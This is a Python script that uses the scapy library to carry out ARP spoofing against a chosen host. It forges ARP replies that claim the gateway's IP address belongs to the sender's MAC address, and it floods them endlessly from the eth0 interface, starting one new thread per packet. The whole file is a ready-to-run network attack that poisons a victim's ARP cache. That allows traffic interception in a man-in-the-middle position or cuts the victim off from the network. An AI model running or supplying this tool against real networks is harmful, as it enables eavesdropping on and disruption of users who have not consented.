# coding:utf-8
import argparse
from scapy.all import *
import threading

parser = argparse.ArgumentParser()
threads = []


def send_pack(arp):
    sendp(arp, iface='eth0')


def main():
    parser.add_argument('-gateway', action='store', dest='gateway_ip', type=str, help=u'请输入网关ip地址')
    parser.add_argument('-targetm', action='store', dest='target_mac', type=str, help=u'请输入目标主机mac地址')
    parser.add_argument('-targeti', action='store', dest='target_ip', type=str, help=u'请输入目标主机ip地址')
    arg = parser.parse_args()
    source_mac = get_if_hwaddr('eth0')
    arp = Ether(src=source_mac, dst=arg.target_mac) / ARP(hwsrc=source_mac, psrc=arg.gateway_ip, hwdst=arg.target_mac,
                                                          pdst=arg.target_ip, op=2)

    while (1):
        t = threading.Thread(target=send_pack, args=arp)
        t.start()
        threads.append(t)
    for i in threads:
        t.join()


if __name__ == '__main__':
    main()

